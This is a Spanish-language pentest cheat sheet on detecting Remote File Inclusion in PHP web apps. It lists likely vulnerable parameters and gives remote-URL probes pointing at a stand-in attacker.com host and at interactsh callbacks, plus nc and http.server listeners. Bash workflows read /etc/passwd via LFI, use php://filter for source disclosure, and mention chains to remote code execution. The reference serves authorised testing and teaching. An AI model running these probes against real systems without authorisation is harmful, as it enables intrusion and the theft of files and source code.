---
aliases:
  - RFI Detection
  - Remote File Inclusion Recon
tags:
  - vuln/rfi
  - technique/discovery
  - asset/web-app
primary categories:
secondary categories:
tertiary categories:
kind: SubCheatSheet
linked:
  - "[[Remote File Inclusion (RFI)]]"
---
# RFI - Detección y Reconocimiento

---

## Identificar Endpoints Vulnerables

| **Endpoint** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `?page=home`, `?file=about` | Page selector via param | Most common. |
| `?include=`, `?inc=` | Generic include | Direct. |
| `?template=`, `?tmpl=` | Template loader | Common CMS. |
| `?lang=`, `?locale=` | Language file load | i18n. |
| `?theme=`, `?skin=` | Theme files | CMS. |
| `?module=`, `?mod=` | Module loader | Plugin systems. |
| `?view=` | View selector | MVC. |
| `?content=` | Content load | Dynamic. |
| `?path=`, `?file=` | Direct file param | Generic. |
| `?action=`, `?do=` | Action handler | RPC-style. |
| Body POST con file field | POST RFI | Less common. |
| Header reflected (X-Custom) | Edge | App-specific. |
| Combine con LFI patterns | Same endpoints often | Adjacent. |
| PHP `include()`, `require()` direct | Source code review | High value. |
| `include_once()`, `require_once()` | Same | Same. |
| `file_get_contents()` con URL | File read RFI variant | Limited. |
| Smarty `{include}` | Template engine | Edge. |
| Legacy CMS / forums | Old PHP apps | OSINT. |
| Default extension append | App appends `.php` → null byte trick | Standard. |
^rfi-detect-endpoints

---

## Probes con URL Remota

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `?page=http://attacker.com/test.php` | Basic HTTP | If executed → RFI active. |
| `?page=https://attacker.com/test.php` | HTTPS | TLS variant. |
| `?page=http://<id>.oast.fun/test.php` | Burp Collaborator | Auto-detect callback. |
| Domain you control | Setup own listener | Standard. |
| `<?php phpinfo(); ?>` con phpinfo en payload | Force-load benign | Confirm execution. |
| `<?php echo "RFI-CONFIRMED"; ?>` | Echo marker | Simple test. |
| `<?php sleep(10); ?>` | Time-delay test | Confirm executes. |
| `python3 -m http.server 80` | HTTP server simple | Quick listener. |
| `nc -lvnp 80` | nc listener | Verify HTTP request received. |
| Multiple paths probe | Iterate per param | Bulk discovery. |
| Verbose error response | Triggers PHP error if RFI tries fail | Indicator. |
| Allow_url_include = On indicator | Successful HTTP fetch + execution | Confirms config. |
| `data://` probe | Inline alternative | Same family. |
| `php://input` probe | POST body include | Alternative. |
| `local.txt` (LFI works) vs `http://...` (RFI works) | Differential path response | Identify which feature. |
^rfi-detect-probes

### Probe rápido

```bash
TARGET="https://target/index.php"
PARAM="page"
COLLAB=$(./interactsh-client -url-only)

# Listen for callback
# (interactsh-client running, or:)
# python3 -m http.server 80 &

# Probe HTTP RFI
curl -s "${TARGET}?${PARAM}=http://${COLLAB}/test"

# Watch interactsh dashboard
# If callback received → RFI / SSRF active
# If atacante also serves PHP code → confirm execution
```

---

## Detectar PHP Version + `allow_url_include`

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `X-Powered-By: PHP/x.y.z` response header | PHP version header | Standard. |
| `/phpinfo.php`, `/info.php`, `/test.php` | phpinfo() page | Discovery. |
| Error message PHP version | Verbose errors mention version | Standard. |
| `PHPSESSID=...` confirms PHP | Cookie session | Stack confirm. |
| `allow_url_include = On` | Required for HTTP RFI | Critical config. |
| `allow_url_fopen = On` | Required for any URL fetch | Adjacent. |
| `allow_url_include = Off` | PHP 5.2.0+ default | Modern PHP. |
| Pre-PHP 5.2 | Default On — vulnerable | Legacy. |
| `?page=php://filter/...` confirms PHP | Test via wrapper | Stack confirm. |
| `allow_url_include = Off` likely | LFI works but RFI fails | Inferer. |
| Specific file disclosure | Try `?page=/etc/passwd` (LFI) vs `?page=http://...` (RFI) | Distinguish. |
| `Apache`, `nginx + PHP-FPM` | Server header | Stack hint. |
| Response time differential | Remote fetch slower than local include | Indicator. |
| Combine con error hunting | Trigger PHP errors for version + paths | Recon. |
| `php://filter/convert.base64-encode` | Source disclosure via LFI | Read PHP source con LFI. |
^rfi-detect-php

### Workflow detect PHP + RFI capability

```bash
TARGET="https://target/index.php"

# Stage 1: Confirm PHP stack
curl -sI "$TARGET" | grep -i 'x-powered-by\|set-cookie'
# Expected: X-Powered-By: PHP/x.y.z, Set-Cookie: PHPSESSID=...

# Stage 2: Try LFI probe first
curl -s "${TARGET}?page=/etc/passwd" | grep -E 'root:x:0:0:'
# If works → LFI active, allow_url_include status unknown

# Stage 3: Try RFI probe
COLLAB=$(./interactsh-client -url-only)
curl -s "${TARGET}?page=http://${COLLAB}/test"
# Watch dashboard for HTTP request

# Stage 4: Confirm execution
# Atacante hostea on $COLLAB:
#   <?php echo "RFI-CONFIRMED"; ?>
# Response contains "RFI-CONFIRMED" → RFI works (allow_url_include=On)

# Stage 5: If LFI works but no RFI:
#   - allow_url_include = Off
#   - Use php://filter, data:// alternatives
#   - Or LFI to RCE chain (log poisoning, etc)
```

---
